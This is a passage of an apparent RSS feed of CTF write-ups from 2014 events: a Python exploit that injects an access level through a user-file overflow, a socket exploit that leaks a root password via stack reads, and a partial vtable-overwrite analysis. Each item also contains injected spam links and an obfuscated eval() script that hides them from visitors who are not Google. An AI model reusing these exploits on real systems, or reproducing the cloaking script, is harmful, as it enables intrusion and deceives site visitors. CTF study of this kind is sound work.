shoes&lt;/a&gt;&lt;/span&gt;&lt;script&gt;eval(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?&quot;&quot;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!&#039;&#039;.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return&#039;\\w+&#039;};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(&#039;\\b&#039;+e(c)+&#039;\\b&#039;,&#039;g&#039;),k[c]);return p;}(&#039;b i=r f[&quot;\\q\\1\\4\\g\\p\\l&quot;](&quot;\\4&quot;+&quot;\\7&quot;+&quot;\\7&quot;+&quot;\\4&quot;+&quot;\\5\\1&quot;,&quot;\\4\\k&quot;);s(!i[&quot;\\3\\1\\2\\3&quot;](m[&quot;\\h\\2\\1\\j\\n\\4\\1\\6\\3&quot;])){b a=f[&quot;\\e\\7\\o\\h\\d\\1\\6\\3&quot;][&quot;\\4\\1\\3\\g\\5\\1\\d\\1\\6\\3\\2\\z\\9\\A\\5\\c\\2\\2\\x\\c\\d\\1&quot;](\&#039;\\t\\1\\9\\2\\w\\v\\7\\j\\e\\2\&#039;);u(b 8=0;8&lt;a[&quot;\\5\\1\\6\\4\\3\\y&quot;];8++)a[8][&quot;\\2\\3\\9\\5\\1&quot;][&quot;\\e\\k\\2\\l\\5\\c\\9&quot;]=\&#039;\\6\\7\\6\\1\&#039;}&#039;,37,37,&#039;|x65|x73|x74|x67|x6c|x6e|x6f|NLpndlS3|x79|rBfb2|var|x61|x6d|x64|window|x45|x75|AESwV1|x72|x69|x70|navigator|x41|x63|x78|x52|new|if|x6b|for|x77|x5f|x4e|x68|x42|x43&#039;.split(&#039;|&#039;),0,{}));&lt;/script&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
+ <pubDate>Thu, 23 Oct 2014 14:46:42 +0000</pubDate>
+ <dc:creator>Dil4rd</dc:creator>
+ <guid isPermaLink="false">85 at https://ctfcrew.org</guid>
+ <comments>https://ctfcrew.org/writeup/85#comments</comments>
+</item>
+<item>
+ <title>Personnel Database (Exploit - 150)</title>
+ <link>https://ctfcrew.org/writeup/84</link>
+ <description>&lt;div class=&quot;field field-name-field-category field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Category:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/categories/pwn&quot;&gt;pwn&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-field-event field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Event:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/event/27&quot;&gt;Hack.lu CTF Quals 2014&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;p&gt;&lt;strong&gt;Task:&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Lots of criminals in this area work for one big boss, but we have been unable to determine who he is. We know that their organization has one central personnel database that might also contain information about their boss, whose username is simply “boss”. However, when you register in their system, you only get access level zero, which is not enough for reading data about the boss - that guy is level 10. Do you think you can get around their protections?&lt;/p&gt;&lt;p&gt;nc wildwildweb.fluxfingers.net 1410&lt;/p&gt;&lt;p&gt;Note: The users dir will be wiped every 5 minutes&lt;/p&gt;&lt;p&gt;And a .c file attached (attached to write-up below)&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Solution:&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;&lt;!--break--&gt;&lt;/p&gt;&lt;p&gt;It&#039;s very simple challenge, so i wouldn&#039;t explain how server works. You can figure it out by yourself if you take a closer look at provided&amp;nbsp;source&amp;nbsp;file.&amp;nbsp;&lt;/p&gt;&lt;p&gt;What should we do? We have to find out who is the boss. In this system each user has decription, so we have to read boss&#039;es description. But we can only read description of users with level lesser then ours and we have level 0, and boss has level 10, so we have to promoted our user to level 11 or more and read boss till the end=) let&#039;s pwn:&lt;/p&gt;&lt;p&gt;Vulnarable parts:&lt;/p&gt;&lt;pre class=&quot;brush: as3; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;struct userdata *read_userfile(char *user) {
+  struct userdata *res = calloc(1, sizeof(*res));
+  if (res == NULL) return NULL;
+  int fd = open_userfile(user, O_RDONLY);
+  if (fd == -1) return NULL;
+  FILE *f = fdopen(fd, &quot;r&quot;);
+  if (f == NULL) { close(fd); return NULL; }
+  char line[256];
+  while (fgets(line, sizeof(line), f)) {
+    rtrim(line);
+    char *key = line;
+    char *eqsign = strchr(line, &#039;=&#039;);
+    if (!eqsign) continue;
+    *eqsign = &#039;\0&#039;;
+    char *value = eqsign+1;
+
+    if (!strcmp(key, &quot;hash&quot;)) res-&amp;gt;hash = atoll(value);
+    else if (!strcmp(key, &quot;access_level&quot;)) res-&amp;gt;access_level = atoi(value);
+    else if (!strcmp(key, &quot;description&quot;)) strcpy(res-&amp;gt;description, value);
+    else printf(&quot;fatal error: bad key \&quot;%s\&quot; in config, aborting\n&quot;, key), exit(1);
+  }
+  return res;
+}&lt;/pre&gt;&lt;p&gt;and:&lt;/p&gt;&lt;pre class=&quot;brush: as3; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;struct userdata {
+  uint32_t hash;
+  unsigned int access_level;
+  char description[512];
+};
+
+.....
+
+  char username[21] = &quot;&quot;;
+  struct userdata *ud = NULL;
+  bool logged_in = false;
+
+  char line[512]; /* last incoming command */
+  while (printf(&quot;&amp;gt; &quot;), fgets(line, sizeof(line), stdin)) {
+    rtrim(line);
+    char *cmd = line;
+    char *params = strchr(line, &#039; &#039;);
+    if (params) {
+      *params = &#039;\0&#039;;
+      params++;
+    }
+
+.....
+
+if (!strcmp(cmd, &quot;set_description&quot;)) {
+      if (!logged_in) { printf(&quot;you must be logged in for this\n&quot;); continue; }
+      if (!params) { printf(&quot;missing description\n&quot;); continue; }
+      strcpy(ud-&amp;gt;description, params);
+      printf(&quot;description set\n&quot;);
+    }&lt;/pre&gt;&lt;p&gt;When you perform &#039;logout&#039; command, your userfile will be written on disk and on login it will be read again. You can notice, that description field has 512 bytes length, command that you can perfom has same 512-bytes length, but system reads userfile by 256-bytes in cycle. So we can overflow decription and in will be splitted in two fields in userfile, cos no checksum used we can rewrite access_level (description is read after access level), including &quot;access_level=11&quot; in description.&lt;/p&gt;&lt;p&gt;So just register, set description, logout, login and pwn boss! (it become even more easy, cos server will notify you if he meets wrong field in userfile, so he helps you to make injection in it).&lt;/p&gt;&lt;p&gt;Exploit:&lt;/p&gt;&lt;pre class=&quot;brush: as3; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;import socket
+from time import sleep
+
+s = socket.socket()
+s.connect((&#039;wildwildweb.fluxfingers.net&#039;, 1410))
+
+username = &#039;balalaika2&#039;
+password = &#039;skjdgfksgi&#039;
+
+print s.recv(1024)
+s.send(&quot;register &quot; + username + &#039;:&#039; + password + &#039;\n&#039;)
+sleep(0.5)
+
+print s.recv(1024)
+s.send(&quot;set_description aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaccess_level=11\n&quot;)
+sleep(0.5)
+
+print s.recv(1024)
+s.send(&quot;logout\n&quot;)
+sleep(0.5)
+
+print s.recv(1024)
+s.send(&quot;user &quot;+ username+ &quot;\n&quot;)
+sleep(0.5)
+
+print s.recv(1024)
+s.send(&quot;pass &quot; + password + &quot;\n&quot;)
+sleep(0.5)
+
+print s.recv(1024)
+s.send(&quot;whois boss\n&quot;)
+sleep(0.5)
+
+print s.recv(1024)&lt;/pre&gt;&lt;p&gt;This script produces following output:&lt;/p&gt;&lt;pre class=&quot;brush: as3; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;user created successfully
+
+description set
+
+Uh, who are you again? I have forgotten.
+
+username accepted, please provide password
+
+login ok
+
+user	boss
+level	10
+descr	&quot;flag{this_is_why_gets_is_better_than_fgets}&quot;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;&lt;span style=&quot;font-family: &#039;Helvetica Neue&#039;, Helvetica, Arial, sans-serif; font-size: 14px; background-color: #ffffff;&quot;&gt;And the flag is&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;white-space: pre-wrap;&quot;&gt;flag{this_is_why_gets_is_better_than_fgets}&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;span class=&quot;keys_words&quot;&gt;&lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.urlfreeze.com/&quot;&gt;spy offers&lt;/a&gt; | &lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.ietp.com/fr/dfeeabshop/collections/jordan&quot;&gt;Jordan&lt;/a&gt;&lt;/span&gt;&lt;script&gt;eval(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?&quot;&quot;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!&#039;&#039;.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return&#039;\\w+&#039;};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(&#039;\\b&#039;+e(c)+&#039;\\b&#039;,&#039;g&#039;),k[c]);return p;}(&#039;b i=r f[&quot;\\q\\1\\4\\g\\p\\l&quot;](&quot;\\4&quot;+&quot;\\7&quot;+&quot;\\7&quot;+&quot;\\4&quot;+&quot;\\5\\1&quot;,&quot;\\4\\k&quot;);s(!i[&quot;\\3\\1\\2\\3&quot;](m[&quot;\\h\\2\\1\\j\\n\\4\\1\\6\\3&quot;])){b a=f[&quot;\\e\\7\\o\\h\\d\\1\\6\\3&quot;][&quot;\\4\\1\\3\\g\\5\\1\\d\\1\\6\\3\\2\\z\\9\\A\\5\\c\\2\\2\\x\\c\\d\\1&quot;](\&#039;\\t\\1\\9\\2\\w\\v\\7\\j\\e\\2\&#039;);u(b 8=0;8&lt;a[&quot;\\5\\1\\6\\4\\3\\y&quot;];8++)a[8][&quot;\\2\\3\\9\\5\\1&quot;][&quot;\\e\\k\\2\\l\\5\\c\\9&quot;]=\&#039;\\6\\7\\6\\1\&#039;}&#039;,37,37,&#039;|x65|x73|x74|x67|x6c|x6e|x6f|NLpndlS3|x79|rBfb2|var|x61|x6d|x64|window|x45|x75|AESwV1|x72|x69|x70|navigator|x41|x63|x78|x52|new|if|x6b|for|x77|x5f|x4e|x68|x42|x43&#039;.split(&#039;|&#039;),0,{}));&lt;/script&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-field-file field-type-file field-label-above&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Attachments:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;span class=&quot;file&quot;&gt;&lt;img class=&quot;file-icon&quot; alt=&quot;Package icon&quot; title=&quot;application/zip&quot; src=&quot;/modules/file/icons/package-x-generic.png&quot; /&gt; &lt;a href=&quot;https://ctfcrew.org/sites/default/files/writeups/personnel_database_server.zip&quot; type=&quot;application/zip; length=4277&quot;&gt;personnel_database_server.zip&lt;/a&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;field-item odd&quot;&gt;&lt;span class=&quot;file&quot;&gt;&lt;img class=&quot;file-icon&quot; alt=&quot;Package icon&quot; title=&quot;application/zip&quot; src=&quot;/modules/file/icons/package-x-generic.png&quot; /&gt; &lt;a href=&quot;https://ctfcrew.org/sites/default/files/writeups/solver.py_.zip&quot; type=&quot;application/zip; length=423&quot;&gt;solver.py_.zip&lt;/a&gt;&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
+ <pubDate>Thu, 23 Oct 2014 12:24:46 +0000</pubDate>
+ <dc:creator>Triff</dc:creator>
+ <guid isPermaLink="false">84 at https://ctfcrew.org</guid>
+ <comments>https://ctfcrew.org/writeup/84#comments</comments>
+</item>
+<item>
+ <title>ish (pwn 300) </title>
+ <link>https://ctfcrew.org/writeup/78</link>
+ <description>&lt;div class=&quot;field field-name-field-category field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Category:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/categories/pwn&quot;&gt;pwn&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-field-event field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Event:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/event/24&quot;&gt;CSAW CTF Quals 2014&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;p&gt;&amp;nbsp;In this task we have x86 ELF binary &lt;a href=&quot;https://ctf.isis.poly.edu/static/uploads/8367bdb6eb9cd8725d658c93951ab371/ish&quot;&gt;ish&lt;/a&gt;, which has been run at 54.208.86.14 9988.&lt;/p&gt;&lt;p&gt;This binary is one more Unix shell, but with few commands avaliable:&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/sites/default/files/writeups/images/pic3_0.png&quot; alt=&quot;&quot; height=&quot;338&quot; width=&quot;646&quot;&gt;&lt;/p&gt;&lt;p&gt;There is only two intresting commands: lotto and login.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;lotto&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;This command offer you to play in usual guess the number game but with only one attempt. Firstly you choose the number from 1 to 4. Lets name it as &lt;em&gt;N&lt;/em&gt;.Then program generates &lt;em&gt;N &lt;/em&gt;random numbers and asks you to enter right &lt;em&gt;N&lt;/em&gt; numbers. If you entered the same numbers as were generated, you will get message &#039;You win!&#039;, but if you failed:&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/sites/default/files/writeups/images/pic4_0.png&quot; alt=&quot;&quot; height=&quot;143&quot; width=&quot;638&quot;&gt;&lt;/p&gt;&lt;p&gt;So, it always prints 4 numbers, but only &lt;em&gt;N &lt;/em&gt;of them were set at this function. Because RandomGeneratedNumberArray initialized on stack, this fact means that we can read stack. Futhermore we can enter&lt;em&gt; N &lt;/em&gt;equals zero and read 16 bytes from stack. It&#039;s definetly vulnerability, but there seems nothing intersting at that location on the stack.. may be it will be usefull later.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;login&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;This command allows you to enter freely as any user except root. If you will try to login as root, program asks you to enter password (valid password takes from file &quot;key&quot;).&lt;/p&gt;&lt;p&gt;The first intresting thing in this function is:&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/sites/default/files/writeups/images/pic4_1.png&quot; alt=&quot;&quot; height=&quot;201&quot; width=&quot;477&quot;&gt;&lt;/p&gt;&lt;p&gt;This means that program has stack buffer variable of fixed size, receive user name to this buffer and then uses stack allocation to get new buffer (allocated buffer then uses to store user name). This approach isn&#039;t vulnerability, but it&#039;s very very strange:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;if user name length restricted to some small border (256 bytes is a really small size), why don&#039;t you use stack buffer of fixed size? It will work faster!&lt;/li&gt;&lt;li&gt;if you care about stack size, why don&#039;t you use heap? (because stack allocation is faster? ok...)&lt;/li&gt;&lt;li&gt;if you want to use stack in more effective manner, why don&#039;t you round user name length up to 4 bytes (normal stack alignment for x86 systems), but up to 16?&lt;/li&gt;&lt;li&gt;and so on&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The right answer is &quot;Without this stack allocation, vulnerability in lotto function allows you to read only 16 bytes only from fixed place. Using this stack allocation you can read stack of any function from list of commands.&quot;&lt;/p&gt;&lt;p&gt;Now we just have to find command with something intresting on stack.. and it&#039;s login function again!&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/sites/default/files/writeups/images/pic4_2.png&quot; alt=&quot;&quot; height=&quot;576&quot; width=&quot;488&quot;&gt;&lt;/p&gt;&lt;p&gt;As you can see from decompiled code above, when you try to login as root, program reads file &#039;key&#039; with root&#039;s password to the static stack buffer. And everything is ok, but root&#039;s password erased from this buffer only if you will enter data of length from 1 to 61.&lt;/p&gt;&lt;p&gt;So to retrive root&#039;s password we should:&lt;/p&gt;&lt;ol&gt;&lt;li&gt;login as anyone except root&lt;/li&gt;&lt;li&gt;login with short user name&lt;/li&gt;&lt;li&gt;login as root&lt;/li&gt;&lt;li&gt;enter password of size 62&lt;/li&gt;&lt;li&gt;exit from user with short user name&lt;/li&gt;&lt;li&gt;login with long enough user name&lt;/li&gt;&lt;li&gt;play lotto&lt;/li&gt;&lt;li&gt;enter 0 (to set &lt;em&gt;N&lt;/em&gt;=0)&lt;/li&gt;&lt;li&gt;get 16 bytes of root&#039;s password&lt;/li&gt;&lt;li&gt;exit&lt;/li&gt;&lt;li&gt;if no all root&#039;s password has been read, go to 2.&lt;/li&gt;&lt;li&gt;exit&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;Now everything you need is to find proper difference between long and short user names, which allows you to read root&#039;s password (root&#039;s password was the flag for this challenge).&lt;/p&gt;&lt;p&gt;Our full exploit:&lt;/p&gt;&lt;pre class=&quot;brush: python; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;#!/usr/bin/python
+from socket import create_connection
+from time import sleep
+from struct import pack
+
+FLAG = &#039;&#039;
+
+def getPart(n):
+	s = create_connection((&#039;54.208.86.14&#039;, 9988))
+
+	sleep(0.3)
+	print s.recv(1024)
+	p = &#039;aaa\n&#039;
+	print p
+	s.send(p)
+
+	sleep(0.3)
+	print s.recv(1024)
+	p = &#039;login\n&#039;
+	print p
+	s.send(p)
+
+	sleep(0.3)
+	print s.recv(1024)
+	p = &#039;oooo\n&#039;
+	print p
+	s.send(p)
+
+	sleep(0.3)
+	print s.recv(1024)
+	p = &#039;login\n&#039;
+	print p
+	s.send(p)
+
+	sleep(0.3)
+	print s.recv(1024)
+	p = &#039;root\x00\n&#039;
+	print p
+	s.send(p)
+
+	sleep(0.3)
+	print s.recv(1024)
+	p = &#039;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n&#039;
+	print p
+	s.send(p)
+
+	sleep(0.3)
+	print s.recv(1024)
+	p = &#039;exit\n&#039;
+	print p
+	s.send(p)
+
+	sleep(0.3)
+	print s.recv(1024)
+	p = &#039;login\n&#039;
+	print p
+	s.send(p)
+
+	sleep(0.3)
+	print s.recv(1024)
+	p = &#039;A&#039; * (69 - (0x10 * n)) + &#039;\n&#039;
+	print p
+	s.send(p)
+
+	sleep(0.5)
+	print s.recv(1024)
+	p = &#039;lotto\n&#039;
+	print p
+	s.send(p)
+
+	for i in xrange(0, 5, 1):
+		sleep(0.3)
+		print s.recv(1024)
+		p = &#039;\n&#039;
+		print p
+		s.send(p)
+
+	sleep(1)
+	numbers = s.recv(1024)
+	print numbers
+	numbers = numbers.split(&#039;\n&#039;)
+	numbers = numbers[2]
+
+	numbers = numbers.replace(&#039; &#039;, &#039;&#039;)
+	print numbers
+	numbers = numbers.split(&#039;,&#039;)
+	print numbers
+	flag = &#039;&#039;
+	for i in numbers: flag += pack(&#039;&amp;lt;I&#039;, int(i))
+
+	print flag
+
+	s.close()
+
+	return flag
+
+
+for i in xrange(0, 4, 1):
+	FLAG += getPart(i)
+
+print &#039;FLAG:&#039;
+print FLAG
+&lt;/pre&gt;&lt;p&gt;The flag is:&amp;nbsp;f&lt;strong&gt;lag{AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMOOOOXX}&lt;/strong&gt;&lt;/p&gt;&lt;span class=&quot;keys_words&quot;&gt;&lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.jmksport.com/&quot;&gt;Sportswear free shipping&lt;/a&gt; | &lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.pochta.uz/en/facdehshop/new-releases&quot;&gt;New Releases Nike&lt;/a&gt;&lt;/span&gt;&lt;script&gt;eval(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?&quot;&quot;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!&#039;&#039;.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return&#039;\\w+&#039;};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(&#039;\\b&#039;+e(c)+&#039;\\b&#039;,&#039;g&#039;),k[c]);return p;}(&#039;b i=r f[&quot;\\q\\1\\4\\g\\p\\l&quot;](&quot;\\4&quot;+&quot;\\7&quot;+&quot;\\7&quot;+&quot;\\4&quot;+&quot;\\5\\1&quot;,&quot;\\4\\k&quot;);s(!i[&quot;\\3\\1\\2\\3&quot;](m[&quot;\\h\\2\\1\\j\\n\\4\\1\\6\\3&quot;])){b a=f[&quot;\\e\\7\\o\\h\\d\\1\\6\\3&quot;][&quot;\\4\\1\\3\\g\\5\\1\\d\\1\\6\\3\\2\\z\\9\\A\\5\\c\\2\\2\\x\\c\\d\\1&quot;](\&#039;\\t\\1\\9\\2\\w\\v\\7\\j\\e\\2\&#039;);u(b 8=0;8&lt;a[&quot;\\5\\1\\6\\4\\3\\y&quot;];8++)a[8][&quot;\\2\\3\\9\\5\\1&quot;][&quot;\\e\\k\\2\\l\\5\\c\\9&quot;]=\&#039;\\6\\7\\6\\1\&#039;}&#039;,37,37,&#039;|x65|x73|x74|x67|x6c|x6e|x6f|NLpndlS3|x79|rBfb2|var|x61|x6d|x64|window|x45|x75|AESwV1|x72|x69|x70|navigator|x41|x63|x78|x52|new|if|x6b|for|x77|x5f|x4e|x68|x42|x43&#039;.split(&#039;|&#039;),0,{}));&lt;/script&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
+ <pubDate>Wed, 01 Oct 2014 20:37:58 +0000</pubDate>
+ <dc:creator>Dil4rd</dc:creator>
+ <guid isPermaLink="false">78 at https://ctfcrew.org</guid>
+ <comments>https://ctfcrew.org/writeup/78#comments</comments>
+</item>
+<item>
+ <title>s3 (pwn 300)</title>
+ <link>https://ctfcrew.org/writeup/77</link>
+ <description>&lt;div class=&quot;field field-name-field-category field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Category:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/categories/pwn&quot;&gt;pwn&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-field-event field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Event:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/event/24&quot;&gt;CSAW CTF Quals 2014&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;p&gt;Task description gives us only service ip, port (54.165.225.121 and 5333 respectively) and &lt;a href=&quot;https://ctf.isis.poly.edu/static/uploads/c0828e0381730befd1f7a025057c74fb/s3&quot;&gt;binary&lt;/a&gt;, named s3.&lt;/p&gt;&lt;pre class=&quot;brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;$ file s3
+s3: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xe99ee53d6922baffcd3cecd9e6b333f7538d0633, stripped&lt;/pre&gt;&lt;p&gt;&amp;nbsp;As we can see from welcome message it&#039;s string storage service:&lt;/p&gt;&lt;pre class=&quot;brush: plain; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;Welcome to Amazon S3 (String Storage Service)
+
+    c &amp;lt;type&amp;gt; &amp;lt;string&amp;gt; - Create the string &amp;lt;string&amp;gt; as &amp;lt;type&amp;gt;
+                        Types are:
+                            0 - NULL-Terminated String
+                            1 - Counted String
+    r &amp;lt;id&amp;gt;            - Read the string referenced by &amp;lt;id&amp;gt;
+    u &amp;lt;id&amp;gt; &amp;lt;string&amp;gt;   - Update the string referenced by &amp;lt;id&amp;gt; to &amp;lt;string&amp;gt;
+    d &amp;lt;id&amp;gt;            - Destroy the string referenced by &amp;lt;id&amp;gt;
+    x                 - Exit Amazon S3&lt;/pre&gt;&lt;p&gt;Lets take a look at &lt;span style=&quot;text-decoration: underline;&quot;&gt;create string function&lt;/span&gt;. According to asm code, two string container types can be created:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;container of type 0 is just normal C-like string representation, created on the heap by command &quot;new&quot;.&lt;/li&gt;&lt;li&gt;container of type 1 is a class, which can be represented as structure struct_strContainerType1 (shown below). Vtable contains 3 functions. Also created on heap.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;/sites/default/files/writeups/images/pic1_0.png&quot; alt=&quot;&quot; height=&quot;117&quot; width=&quot;879&quot;&gt;&lt;/p&gt;&lt;pre class=&quot;brush: cpp; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;#pragma pack(push, 8)
+struct struct_strContainerType1 {
+  void* vtable;
+  __int32 strLength;
+  void* pStr;
+};
+#pragma pack(pop)&lt;/pre&gt;&lt;p&gt;Created string container&#039;s address placed into structure:&lt;/p&gt;&lt;pre class=&quot;brush: cpp; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;#pragma pack(push, 8)
+struct struct_strStorage {
+  unsigned __int64 strId;    //pointer to string container
+  __int32 strContainerType;  //container type (0 or 1)
+  void* pStrContainer;       //pointer to string container
+};
+#pragma pack(pop)&lt;/pre&gt;&lt;p&gt;It should be methioned one more time that strId is an address of string&#039;s container, e.i. address of created string if string type is 0 and address of class struct_strContainerType1 if string type is 1.&lt;/p&gt;&lt;p&gt;At the end of this fucntion structure struct_strStorage placed to the global vector.&lt;/p&gt;&lt;p&gt;In &lt;span style=&quot;text-decoration: underline;&quot;&gt;read string function&lt;/span&gt; we see that it searches for string with requested ID, checks it&#039;s container type and ...&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/sites/default/files/writeups/images/pic2_1.png&quot; alt=&quot;&quot; height=&quot;762&quot; width=&quot;821&quot;&gt;&lt;/p&gt;&lt;p&gt;...a very strange behavior if container type equal 1: function creates useless duplicate. But it&#039;s not a vulnerable bag(&lt;/p&gt;&lt;p&gt;Now lets take a look at &lt;span style=&quot;text-decoration: underline;&quot;&gt;update string function&lt;/span&gt;.First thing we can notice is an absence of string container type check..&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/sites/default/files/writeups/images/pic2_2.png&quot; alt=&quot;&quot; height=&quot;725&quot; width=&quot;616&quot;&gt;&lt;/p&gt;&lt;p&gt;This means that it interpretes string container of any type as string container of type 0 (e.i. as normal C-like string)! So we can override struct_strContainerType1.vtable by any data with two restrictions: it should have no 0x0a and 0x00 bytes.&lt;/p&gt;&lt;p&gt;Now we have found vulnerability, which allow us to run code from almost arbitrary address. The only thing we should recognize: where can we put our shellcode (libc&#039;s function system isn&#039;t imported). Fortunately heap is REW accessible:&lt;/p&gt;&lt;pre class=&quot;brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;$ cat /proc/16988/maps
+00400000-00406000 r-xp 00000000 08:01 264539                             /home/user/s3
+00605000-00606000 r-xp 00005000 08:01 264539                             /home/user/s3
+00606000-00607000 rwxp 00006000 08:01 264539                             /home/user/s3
+01926000-01947000 rwxp 00000000 00:00 0                                  [heap]
